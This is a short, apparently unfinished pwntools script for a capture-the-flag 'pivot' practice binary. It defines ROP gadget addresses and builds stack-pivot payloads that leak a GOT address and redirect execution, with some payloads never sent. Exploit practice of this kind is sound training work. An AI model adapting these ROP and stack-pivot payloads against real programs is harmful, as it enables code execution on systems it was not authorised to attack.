#!/usr/bin/python3
import pwn
import sys
binary = "./pivot"
pwn.context.binary = binary
pwn.context.encoding = "latin"
pwn.context.log_level = "debug"

gadgets = {
    "pop_rax_ret":0x4009bb,
    "xchg_rsp_rax":0x4009bd,
    "mov_rax_ptr_rax":0x4009c0,
    "add_rax_rbp":0x4009c4,
    "pop_rdi_ret":0x400a33,
    "foothold_function@plt":0x400720,
    "foothold_function@got":0x601040,
    "puts@plt":0x4006e0,
    "main":0x400847
}

padding = 40
lib_got_offset = 279
debug_script = ""

with open("debug.gdb", "r") as file_io:
    debug_script += file_io.read()

payload_1 = pwn.flat(
    pwn.p64(gadgets["foothold_function@plt"]),
    pwn.p64(gadgets["pop_rdi_ret"]),
    pwn.p64(gadgets["foothold_function@got"]),
    pwn.p64(gadgets["puts@plt"]),
    pwn.p64(gadgets["main"]),
    b"\n"
) 

io = pwn.gdb.debug(binary, gdbscript=debug_script, log_level="debug")
io.recvuntil(": ")
leak = io.recvline().strip()
pwn.info(f"leak found {leak}")

payload_2 = pwn.flat(
    b"A"*padding,
    pwn.p64(gadgets["pop_rax_ret"]),
    pwn.p64(int(leak, 16)),
    #pwn.p64(address),
    pwn.p64(gadgets["xchg_rsp_rax"])
)

payload_3 = pwn.flat(
    pwn.asm('nop'),
    b"\n"
)

payload_4 = pwn.flat(
    b"A"*padding,
    pwn.p64(gadgets["foothold_function@got"] + lib_got_offset)
)